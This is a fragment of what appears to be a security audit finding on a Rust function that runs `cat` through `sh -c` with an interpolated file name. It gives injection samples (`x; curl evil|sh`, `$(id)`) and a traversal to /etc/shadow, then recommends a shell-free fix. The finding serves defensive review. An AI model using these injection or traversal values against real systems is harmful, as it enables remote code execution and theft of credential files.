              "failureScenario": "name is interpolated into the string `cat /srv/data/{name}` and executed by `sh -c`. A name such as `x; curl evil|sh` or `$(id)` runs arbitrary shell commands. A name like `../../etc/shadow` also traverses out of /srv/data. The clean variant rejects '..' and '/', then invokes cat directly with `--` and no shell. Reachability is unknown: run is a private fn, and no caller exists in any supplied file, so who controls `name` cannot be established. The unwrap() on status() can also panic.",
              "action": "Do not use a shell. Use Command::new(\"cat\").arg(\"--\").arg(path) after validating name, as the clean variant does. Better still, read the file with std::fs. Return an error instead of unwrap().",
